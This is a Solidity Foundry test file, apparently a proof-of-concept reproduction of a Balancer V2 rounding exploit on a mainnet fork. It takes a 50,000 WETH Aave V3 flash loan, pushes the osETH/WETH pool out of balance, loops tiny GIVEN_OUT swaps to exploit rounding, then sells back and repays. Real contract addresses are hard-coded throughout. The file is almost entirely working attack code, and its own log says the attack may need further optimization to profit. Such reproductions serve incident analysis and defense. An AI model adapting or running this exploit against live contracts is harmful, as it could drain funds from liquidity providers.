// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title Balancer V2 Rounding Exploit - 使用真实闪电贷
 * @notice 完整复现三阶段攻击，使用 Aave V3 闪电贷
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    
    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }
    
    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }
    
    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);
    
    function getPoolTokens(bytes32 poolId) 
        external view 
        returns (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
}

interface IComposableStablePool {
    function getPoolId() external view returns (bytes32);
}

// Aave V3 闪电贷接口
interface IPoolV3 {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiverV3 {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract ExploitExecutor is IFlashLoanReceiverV3 {
    address constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant osETH_wETH_POOL = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant osToken = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    
    bytes32 poolId;
    
    constructor() {
        poolId = IComposableStablePool(osETH_wETH_POOL).getPoolId();
    }
    
    function initiateAttack() external {
        console.log("========================================");
        console.log("BALANCER V2 ROUNDING EXPLOIT - REAL FLASHLOAN");
        console.log("========================================");
        console.log("");
        
        // 准备闪电贷
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 50000 ether;
        
        uint256[] memory interestRateModes = new uint256[](1);
        interestRateModes[0] = 0; // no debt
        
        console.log("=== INITIATING FLASHLOAN ===");
        console.log("Borrowing:", amounts[0] / 1e18, "WETH");
        console.log("From: Aave V3");
        console.log("");
        
        IPoolV3(AAVE_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            interestRateModes,
            address(this),
            "",
            0
        );
    }
    
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == AAVE_POOL, "Only Aave Pool");
        require(initiator == address(this), "Only self");
        
        console.log("=== FLASHLOAN RECEIVED ===");
        console.log("Amount:", amounts[0] / 1e18, "WETH");
        console.log("Premium:", premiums[0] / 1e18, "WETH");
        console.log("");
        
        uint256 totalDebt = amounts[0] + premiums[0];
        
        // ========================================
        // PHASE 1: COMPRESSION
        // ========================================
        console.log("=== PHASE 1: COMPRESSION ===");
        
        (, uint256[] memory initialBalances,) = 
            IBalancerVault(VAULT).getPoolTokens(poolId);
        
        console.log("Pool before:");
        console.log("  WETH:", initialBalances[0] / 1e18, "ether");
        console.log("  osETH:", initialBalances[2] / 1e18, "ether");
        console.log("");
        
        IERC20(WETH).approve(VAULT, type(uint256).max);
        
        uint256 osETHFromPhase1 = IBalancerVault(VAULT).swap(
            IBalancerVault.SingleSwap({
                poolId: poolId,
                kind: IBalancerVault.SwapKind.GIVEN_IN,
                assetIn: WETH,
                assetOut: osToken,
                amount: amounts[0],
                userData: ""
            }),
            IBalancerVault.FundManagement({
                sender: address(this),
                fromInternalBalance: false,
                recipient: payable(address(this)),
                toInternalBalance: false
            }),
            0,
            block.timestamp
        );
        
        (, uint256[] memory compressedBalances,) = 
            IBalancerVault(VAULT).getPoolTokens(poolId);
        
        console.log("Pool after:");
        console.log("  WETH:", compressedBalances[0] / 1e18, "ether");
        console.log("  osETH:", compressedBalances[2] / 1e18, "ether");
        console.log("  Ratio:", compressedBalances[0] / compressedBalances[2], ":1");
        console.log("");
        console.log("Received:", osETHFromPhase1 / 1e18, "osETH");
        console.log("");
        
        // ========================================
        // PHASE 2: ROUNDING EXPLOIT
        // ========================================
        console.log("=== PHASE 2: ROUNDING EXPLOIT ===");
        
        uint256 trickAmt = 1e9; // 1 gwei
        uint256 loops = 30;
        
        console.log("Loops:", loops);
        console.log("Each:", trickAmt / 1e9, "gwei osETH");
        console.log("");
        
        uint256 totalWETHSpentPhase2 = 0;
        uint256 totalOsETHPhase2 = 0;
        
        for (uint256 i = 0; i < loops; i++) {
            uint256 wethSpent = IBalancerVault(VAULT).swap(
                IBalancerVault.SingleSwap({
                    poolId: poolId,
                    kind: IBalancerVault.SwapKind.GIVEN_OUT,
                    assetIn: WETH,
                    assetOut: osToken,
                    amount: trickAmt,
                    userData: ""
                }),
                IBalancerVault.FundManagement({
                    sender: address(this),
                    fromInternalBalance: false,
                    recipient: payable(address(this)),
                    toInternalBalance: false
                }),
                type(uint256).max,
                block.timestamp
            );
            
            totalWETHSpentPhase2 += wethSpent;
            totalOsETHPhase2 += trickAmt;
        }
        
        console.log("Phase 2 complete:");
        console.log("  WETH spent:", totalWETHSpentPhase2 / 1e15, "* 0.001 ether");
        console.log("  osETH gained:", totalOsETHPhase2 / 1e9, "gwei");
        console.log("");
        
        // ========================================
        // PHASE 3: EXTRACTION
        // ========================================
        console.log("=== PHASE 3: EXTRACTION ===");
        
        uint256 totalOsETH = IERC20(osToken).balanceOf(address(this));
        console.log("Selling:", totalOsETH / 1e18, "osETH");
        
        IERC20(osToken).approve(VAULT, totalOsETH);
        
        uint256 wethReceived = IBalancerVault(VAULT).swap(
            IBalancerVault.SingleSwap({
                poolId: poolId,
                kind: IBalancerVault.SwapKind.GIVEN_IN,
                assetIn: osToken,
                assetOut: WETH,
                amount: totalOsETH,
                userData: ""
            }),
            IBalancerVault.FundManagement({
                sender: address(this),
                fromInternalBalance: false,
                recipient: payable(address(this)),
                toInternalBalance: false
            }),
            0,
            block.timestamp
        );
        
        console.log("Received:", wethReceived / 1e18, "WETH");
        console.log("");
        
        // ========================================
        // REPAY FLASHLOAN
        // ========================================
        console.log("=== REPAYING FLASHLOAN ===");
        
        uint256 finalBalance = IERC20(WETH).balanceOf(address(this));
        
        console.log("Balance:", finalBalance / 1e18, "WETH");
        console.log("Debt:", totalDebt / 1e18, "WETH");
        
        // 批准 Aave 拿回钱
        IERC20(WETH).approve(AAVE_POOL, totalDebt);
        
        if (finalBalance >= totalDebt) {
            uint256 profit = finalBalance - totalDebt;
            console.log("");
            console.log("Can repay: YES");
            console.log("Profit:", profit / 1e15, "* 0.001 ether");
            console.log("");
            console.log("SUCCESS!");
        } else {
            uint256 shortage = totalDebt - finalBalance;
            console.log("");
            console.log("Can repay: NO");
            console.log("Shortage:", shortage / 1e18, "WETH");
            console.log("");
            console.log("NOTE: Exploit demonstrated, but not profitable");
            console.log("Real attack needs additional optimization");
        }
        
        console.log("");
        console.log("========================================");
        console.log("EXPLOIT COMPLETE");
        console.log("========================================");
        
        return true;
    }
}

contract CompleteExploitWithRealFlashLoan is Test {
    ExploitExecutor public executor;
    
    function setUp() public {
        vm.createSelectFork("mainnet", 21373973 - 1);
        executor = new ExploitExecutor();
    }
    
    function testCompleteExploitRealFlashLoan() public {
        executor.initiateAttack();
    }
}
